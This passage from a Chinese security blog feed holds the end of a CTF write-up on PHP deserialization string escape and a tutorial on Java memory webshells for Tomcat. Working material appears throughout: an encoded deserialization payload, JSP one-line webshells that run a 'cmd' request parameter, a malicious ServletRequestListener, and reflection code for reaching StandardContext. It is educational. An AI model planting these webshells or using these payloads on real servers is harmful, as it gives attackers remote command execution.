class="line">root=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&amp;pwd=<span class="string">&quot;;s:5:&quot;</span>datou<span class="string">&quot;;O%3A7%3A%22pull_it%22%3A1%3A%7Bs%3A10%3A%22%00pull_it%00x%22%3Bs%3A41%3A%22%28%22%08%02%08%08%05%0D%22%5E%22%7B%7B%7B%7C%60%60%22%29%28%22%03%01%08%00%00%06%00%22%5E%22%60%60%7C+%2F%60%2A%22%29%3B%22%3B%7D</span></span><br></pre></td></tr></table></figure><p>(逃逸了14个字符)</p><p>这里解释一下</p><p><img src="../images/image-20230724190419607.png" alt="image-20230724190419607"></p><p><strong>刚好是14个  其实也可以不是14个  这要看你自己的构造了</strong></p><p>先使用常规的方法生成一下实例化的内容·</p><p><img src="../images/image-20230724190736840.png" alt="image-20230724190736840"></p><p><code>aa</code>是我们<code>root</code>传入的位置  <code>bb</code>是我们<code>pwd</code>传入的位置  </p><p><img src="../images/image-20230724190920747.png" alt="image-20230724190920747"></p><p>这是<strong>payload</strong>   这里一共传入了<strong>82个b</strong>字符   经过这个反序列化的时候 <strong>a函数</strong>的替换</p><p><img src="../images/image-20230724191030189.png" alt="image-20230724191030189"></p><p>会变成42个字符a   于是给我们提供了42位的逃逸空间</p><p>于是我们就可以查看</p><p><img src="../images/image-20230724191238844.png" alt="image-20230724191238844"></p><p><img src="../images/image-20230724191508816.png" alt="image-20230724191508816"></p><p>然后就是<code>13+29==42</code>就会成功逃逸成功  后面跟着<code>pull_it</code>这个序列化后的恶意类</p><p>因为逃逸的关系  (<strong>原本的<code>pwd</code>参数也变成了<code>root</code>的值，然后又添加进来一个<code>datou</code>，刚好满足两个参数的要求</strong>)</p><p>于是就成功逃逸出来了(<strong>后面多出来的一些字符并不影响 并且直接添加一个序列化后的类也是可以反序列化的</strong> )</p><p><img src="../images/image-20230724191908997.png" alt="image-20230724191908997"></p><p><strong>本地测试过了</strong>  </p><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><ul><li><strong>重新温习了字符串逃逸这个知识点</strong></li><li><strong>学到了这个在一个序列化后的字符串后面继续添加一个别的类的序列化字符串也是可以一起进行反序列化</strong></li></ul><p><strong>测试过程的代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$system</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$command</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$s</span>,<span class="variable">$c</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;system = <span class="variable">$s</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;command = <span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">system</span>(calc));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$t</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;calc&#x27;</span>);</span><br><span class="line"><span class="comment">//echo serialize($t);</span></span><br><span class="line"><span class="comment">//O:4:&quot;test&quot;:2:&#123;s:6:&quot;system&quot;;s:6:&quot;system&quot;;s:7:&quot;command&quot;;s:4:&quot;calc&quot;;&#125;</span></span><br><span class="line"><span class="variable">$u</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>(<span class="string">&#x27;aa&#x27;</span>,<span class="string">&#x27;bb&#x27;</span>);</span><br><span class="line"><span class="comment">//echo serialize($u);</span></span><br><span class="line"><span class="comment">//O:4:&quot;user&quot;:2:&#123;s:8:&quot;username&quot;;s:2:&quot;aa&quot;;s:8:&quot;password&quot;;s:2:&quot;bb&quot;;O:4:&quot;test&quot;:2:&#123;s:6:&quot;system&quot;;s:6:&quot;system&quot;;s:7:&quot;command&quot;;s:4:&quot;calc&quot;;&#125;&#125;</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:4:&quot;user&quot;:2:&#123;s:8:&quot;username&quot;;s:2:&quot;aa&quot;;s:8:&quot;password&quot;;s:2:&quot;bb&quot;;O:4:&quot;test&quot;:2:&#123;s:6:&quot;system&quot;;s:6:&quot;system&quot;;s:7:&quot;command&quot;;s:4:&quot;calc&quot;;&#125;&quot;&quot;;&#125;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;BabyURL&quot;&gt;&lt;a href=&quot;#BabyURL&quot; class=&quot;headerlink&quot; title=&quot;BabyURL&quot;&gt;&lt;/a&gt;BabyURL&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;审计代码得出一个思路&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;就是在反序列化的时候会将得到的</summary>
      
    
    
    
    
    <category term="巅峰极客2023-Web" scheme="https://ke1nys.github.io/tags/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023-Web/"/>
    
  </entry>
  
  <entry>
    <title>java-内存马</title>
    <link href="https://ke1nys.github.io/posts/333d5c9f.html"/>
    <id>https://ke1nys.github.io/posts/333d5c9f.html</id>
    <published>2023-07-20T07:45:30.000Z</published>
    <updated>2023-08-17T09:31:50.108Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://goodapple.top/archives/1355">参考文章</a>     <a href="https://github.com/Claradoll/Security_Learning">题目用到的代码地址</a></p><p><strong>内存马的分类</strong></p><p><img src="../images/image-20230720170329358.png" alt="image-20230720170329358"></p><p>解释一下<code>servlet</code></p><p><img src="../images/image-20230731220207808.png" alt="image-20230731220207808"></p><p><strong>就是大致分为这四种   下面会依次讲到</strong></p><p><strong>这里的话先了解一下  <code>JSP</code>  是什么</strong></p><h2 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h2><h3 id="JSP简介"><a href="#JSP简介" class="headerlink" title="JSP简介"></a>JSP简介</h3><p><strong>这里主要了解一下  <code>JSP</code>  的语法</strong>    </p><p>JSP（Java Server Pages），是Java的一种动态网页技术。在早期Java的开发技术中，Java程序员如果想要向浏览器输出一些数据，就必须得手动<code>println</code>一行行的HTML代码。为了解决这一繁琐的问题，Java开发了JSP技术。</p><p>JSP可以看作一个Java Servlet，主要用于实现Java web应用程序的用户界面部分。网页开发者们通过结合HTML代码、XHTML代码、XML元素以及嵌入JSP操作和命令来编写JSP。</p><p>当第一次访问JSP页面时，Tomcat服务器会将JSP页面翻译成一个java文件，并将其编译为.class文件。JSP通过网页表单获取用户输入数据、访问数据库及其他数据源，然后动态地创建网页。</p><h3 id="JSP语法"><a href="#JSP语法" class="headerlink" title="JSP语法"></a>JSP语法</h3><h4 id="脚本程序"><a href="#脚本程序" class="headerlink" title="脚本程序"></a>脚本程序</h4><p>脚本程序可以包含任意量的<strong>Java语句、变量、方法或表达式</strong>，只要它们在脚本语言中是有效的。脚本程序的格式如下</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% 代码片段 %&gt;</span><br></pre></td></tr></table></figure><p>其等价与下面的XML语句</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">jsp:scriptlet</span>&gt;</span></span><br><span class="line">   代码片段</span><br><span class="line"><span class="tag">&lt;/<span class="name">jsp:scriptlet</span>&gt;</span></span><br></pre></td></tr></table></figure><p>下面是使用实例</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;Hello World!&lt;/h2&gt;</span><br><span class="line">&lt;% out.println(<span class="string">&quot;success&quot;</span>);%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230720162202992.png" alt="image-20230720162202992"></p><h4 id="JSP声明"><a href="#JSP声明" class="headerlink" title="JSP声明"></a>JSP声明</h4><p>一个声明语句可以声明<strong>一个或多个变量、方法</strong>，供后面的Java代码使用。JSP声明语句格式如下</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%! 声明  %&gt;</span><br></pre></td></tr></table></figure><p>等同于下面的XML语句</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">jsp:declaration</span>&gt;</span></span><br><span class="line">   代码片段</span><br><span class="line"><span class="tag">&lt;/<span class="name">jsp:declaration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>下面是使用示例</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;Hello World!&lt;/h2&gt;</span><br><span class="line">&lt;%! <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&lt;% out.println(<span class="string">&quot;s&quot;</span>);%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230720162541860.png" alt="image-20230720162541860"></p><h4 id="JSP表达式"><a href="#JSP表达式" class="headerlink" title="JSP表达式"></a>JSP表达式</h4><p>如果JSP表达式中为一个对象，则会自动调用其<code>toString()</code>方法。格式如下，注意表达式后没有<code>;</code></p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%= 表达式  %&gt;</span><br></pre></td></tr></table></figure><p>等价于下面的XML表达式</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">jsp:expression</span>&gt;</span></span><br><span class="line">   表达式</span><br><span class="line"><span class="tag">&lt;/<span class="name">jsp:expression</span>&gt;</span></span><br></pre></td></tr></table></figure><p>下面是使用示例</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;Hello World!!!&lt;/h2&gt;</span><br><span class="line">&lt;p&gt;</span><br><span class="line">&lt;% <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;Feng&quot;</span>; %&gt;</span><br><span class="line">username:&lt;%=name%&gt;</span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230720163023029.png" alt="image-20230720163023029"></p><h4 id="JSP指令"><a href="#JSP指令" class="headerlink" title="JSP指令"></a>JSP指令</h4><p>JSP指令用来设置与整个JSP页面相关的属性。下面有三种JSP指令</p><div class="table-container"><table><thead><tr><th>指令</th><th>描述</th></tr></thead><tbody><tr><td>&lt;%@ page … %&gt;</td><td>定义页面的依赖属性，比如脚本语言、error页面、缓存需求等等</td></tr><tr><td>&lt;%@ include … %&gt;</td><td>包含其他文件</td></tr><tr><td>&lt;%@ taglib … %&gt;</td><td>引入标签库的定义，可以是自定义标签</td></tr></tbody></table></div><p>比如我们能通过page指令来设置jsp页面的编码格式</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br></pre></td></tr></table></figure><p>使用示例</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;Hello World!!!&lt;/h2&gt;</span><br><span class="line">&lt;p&gt;</span><br><span class="line">    &lt;% <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;林&quot;</span>; %&gt;</span><br><span class="line">    用户名：&lt;%=name%&gt;</span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230720163914388.png" alt="image-20230720163914388"></p><h4 id="JSP注释"><a href="#JSP注释" class="headerlink" title="JSP注释"></a>JSP注释</h4><p>格式</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%-- 注释内容 --%&gt;</span><br></pre></td></tr></table></figure><h3 id="JSP内置对象"><a href="#JSP内置对象" class="headerlink" title="JSP内置对象"></a>JSP内置对象</h3><p>JSP有九大内置对象，他们能够在客户端和服务器端交互的过程中分别完成不同的功能。其特点如下</p><ul><li>由 JSP 规范提供，不用编写者实例化</li><li>通过 Web 容器实现和管理</li><li>所有 JSP 页面均可使用</li><li>只有在脚本元素的表达式或代码段中才能使用</li></ul><div class="table-container"><table><thead><tr><th style="text-align:left">对象</th><th style="text-align:left">类型</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">request</td><td style="text-align:left">javax.servlet.http.HttpServletRequest</td><td style="text-align:left">获取用户请求信息</td></tr><tr><td style="text-align:left">response</td><td style="text-align:left">javax.servlet.http.HttpServletResponse</td><td style="text-align:left">响应客户端请求，并将处理信息返回到客户端</td></tr><tr><td style="text-align:left">response</td><td style="text-align:left">javax.servlet.jsp.JspWriter</td><td style="text-align:left">输出内容到 HTML 中</td></tr><tr><td style="text-align:left">session</td><td style="text-align:left">javax.servlet.http.HttpSession</td><td style="text-align:left">用来保存用户信息</td></tr><tr><td style="text-align:left">application</td><td style="text-align:left">javax.servlet.ServletContext</td><td style="text-align:left">所有用户共享信息</td></tr><tr><td style="text-align:left">config</td><td style="text-align:left">javax.servlet.ServletConfig</td><td style="text-align:left">这是一个 Servlet 配置对象，用于 Servlet 和页面的初始化参数</td></tr><tr><td style="text-align:left">pageContext</td><td style="text-align:left">javax.servlet.jsp.PageContext</td><td style="text-align:left">JSP 的页面容器，用于访问 page、request、application 和 session 的属性</td></tr><tr><td style="text-align:left">page</td><td style="text-align:left">javax.servlet.jsp.HttpJspPage</td><td style="text-align:left">类似于 Java 类的 this 关键字，表示当前 JSP 页面</td></tr><tr><td style="text-align:left">exception</td><td style="text-align:left">java.lang.Throwable</td><td style="text-align:left">该对象用于处理 JSP 文件执行时发生的错误和异常；只有在 JSP 页面的 page 指令中指定 isErrorPage 的取值 true 时，才可以在本页面使用 exception 对象</td></tr></tbody></table></div><h2 id="Java木马"><a href="#Java木马" class="headerlink" title="Java木马"></a>Java木马</h2><p>我们先来看看传统的JSP木马是如何实现的</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>));%&gt;</span><br></pre></td></tr></table></figure><p>上面是最简单的一句话木马，没有回显，适合用来反弹shell。下面是一个带回显的JSP木马</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;% <span class="keyword">if</span>(request.getParameter(<span class="string">&quot;cmd&quot;</span>)!=<span class="literal">null</span>)&#123;</span><br><span class="line">    java.io.<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream();</span><br><span class="line"> </span><br><span class="line">    <span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in));</span><br><span class="line">    String line;</span><br><span class="line">    <span class="type">PrintWriter</span> <span class="variable">printWriter</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">    printWriter.write(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="literal">null</span>)&#123;</span><br><span class="line">        printWriter.println(line);</span><br><span class="line">    &#125;</span><br><span class="line">    printWriter.write(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230720165934722.png" alt="image-20230720165934722"></p><p><strong>这就是上面代码的含义</strong></p><p>传统的JSP木马特征性强，且需要文件落地，容易被查杀。因此现在出现了内存马技术。Java内存马又称”无文件马”，相较于传统的JSP木马，其最大的特点就是无文件落地，存在于内存之中，隐蔽性强。</p><h2 id="Tomcat中的三种Context"><a href="#Tomcat中的三种Context" class="headerlink" title="Tomcat中的三种Context"></a>Tomcat中的三种Context</h2><p>这里的话就不跟着上面的文章写了 </p><p>直接看总结就行了</p><p><strong>直接用一张图来展示这三者的关系</strong></p><p><img src="../images/image-20230720171447069.png" alt="image-20230720171447069"></p><p>这三者是我们在学习内存马的时候会经常遇到的</p><p><code>ServletContext</code>接口的实现类为<code>ApplicationContext</code>类和<code>ApplicationContextFacade</code>类，其中<code>ApplicationContextFacade</code>是对<code>ApplicationContext</code>类的包装。我们对<code>Context</code>容器中各种资源进行操作时，最终调用的还是<code>StandardContext</code>中的方法，因此<code>StandardContext</code>是<code>Tomcat</code>中负责与底层交互的<code>Context</code>。</p><h2 id="Tomcat内存马"><a href="#Tomcat内存马" class="headerlink" title="Tomcat内存马"></a>Tomcat内存马</h2><p>在学习下面三种类型的内存马的时候可以看看这篇文章  因为这篇文章很好的解释了下面三者的含义    </p><p><a href="https://goodapple.top/archives/1359">tomcat详解</a></p><p>Tomcat内存马大致可以分为三类，分别是Listener型、Filter型、Servlet型。可能有些朋友会发现，这不正是Java Web核心的三大组件嘛！没错，Tomcat内存马的核心原理就是动态地将恶意组件添加到正在运行的Tomcat服务器中。</p><p>而这一技术的实现有赖于官方对Servlet3.0的升级，Servlet在3.0版本之后能够支持动态注册组件。而Tomcat直到7.x才支持Servlet3.0，因此通过动态添加恶意组件注入内存马的方式适合Tomcat7.x及以上。为了便于调试Tomcat，我们先在父项目的pom文件中引入Tomcat依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-catalina<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.55<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里的使用的文件直接就是文章开头的<code>github</code>地址用的   下载下来导入就行了</p><h3 id="Listener型"><a href="#Listener型" class="headerlink" title="Listener型"></a>Listener型</h3><p>根据以上思路，我们的目标就是在服务器中动态注册一个恶意的Listener。而Listener根据事件源的不同，大致可以分为如下三种</p><ul><li>ServletContextListener</li><li>HttpSessionListener</li><li>ServletRequestListener</li></ul><p>很明显，ServletRequestListener是最适合用来作为内存马的。因为ServletRequestListener是用来监听ServletRequest对象的，当我们访问任意资源时，都会触发<code>ServletRequestListener#requestInitialized()</code>方法。下面我们来实现一个恶意的Listener</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Listener;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebListener</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Listener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">        String cmd=request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(cmd);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (NullPointerException n)&#123;</span><br><span class="line">            n.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>这里的话模拟动态注册进去的<code>Listener</code>内存马</strong>      (<strong>等会我们分析完这个流程就会重新动态的导入一个内存马，并把上面的这个代码给注释掉</strong>)</p><p><img src="../images/image-20230720172131744.png" alt="image-20230720172131744"></p><p>​    </p><p>给这里下个断点  然后<code>debug</code>一下 得到他的利用栈</p><p><img src="../images/image-20230720172237569.png" alt="image-20230720172237569"></p><p>分析这个利用栈</p><p><code>StandardContext#fireRequestInitEvent</code>调用了我们的<code>Listener</code>，我们跟进看其实现</p><p><img src="../images/image-20230720172338598.png" alt="image-20230720172338598"></p><p>关键代码有两处，首先通过<code>getApplicationEventListeners()</code>获取一个Listener数组，然后遍历数组调用<code>listener.requestInitialized(event)</code>方法触发Listener。跟进<code>getApplicationEventListeners()</code>方法</p><p>这里的获取这个<code>Listener</code>就是关键了  因为就是我们就是恶意构造一个<code>Listener</code>传进去 然后让其获取加载(<strong>不出意外的话继续找下去能找到添加<code>Listener</code>的地方</strong>)</p><p><img src="../images/image-20230720173457320.png" alt="image-20230720173457320"></p><p>可以看到Listener实际上是存储在<em><code>applicationEventListenersList</code></em>属性中的</p><p><img src="../images/image-20230720173533994.png" alt="image-20230720173533994"></p><p>并且我们可以通过<code>StandardContext#addApplicationEventListener()</code>方法来添加<code>Listener</code></p><p><img src="../images/image-20230720173728831.png" alt="image-20230720173728831"></p><p>看到这里的话就和我们刚开始添加的这个<code>Listener</code>联系到一起了</p><p><img src="../images/image-20230720173826866.png" alt="image-20230720173826866"></p><p>实际情况中是没有它的  现在我们分析利用链  分析到了这个添加<code>listener</code>的地方</p><p>所以我们就得想办法构造恶意的<code>listener</code>来添加进去了</p><h4 id="获取StandardContext类"><a href="#获取StandardContext类" class="headerlink" title="获取StandardContext类"></a>获取StandardContext类</h4><p>下面的工作就是获取<code>StandardContext</code>类了，在<code>StandardHostValve#invoke</code>中，可以看到其通过request对象来获取<code>StandardContext</code>类</p><p><img src="../images/image-20230720174343442.png" alt="image-20230720174343442"></p><p>同样地，由于<code>JSP</code>内置了<code>request</code>对象，我们也可以使用同样的方式来获取</p><p><strong>(一共内置了9个对象   <code>request</code>是其中一个)</strong></p><p><img src="../images/image-20230731225244116.png" alt="image-20230731225244116"></p><p>所以获取<code>StandardContext</code>的方法是</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>这里的<code>request</code>是 <code>HttpServletRequest</code> 类的对象</p><p>先是获取了request对象里面的request属性   然后将该属性设置为可访问</p><p>在此行中通过调用该引用上的 get() 方法来获取实际存储在 “request” 字段中的值，并将其强制转换为类型 Request 并赋值给名为 req 的变量(<strong>为什么要用这个Request类型  图片上有标注</strong>)</p><p>然后就能获取到<code>StandardContext</code> 了</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"><span class="type">WebappClassLoaderBase</span> <span class="variable">webappClassLoaderBase</span> <span class="operator">=</span> (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span 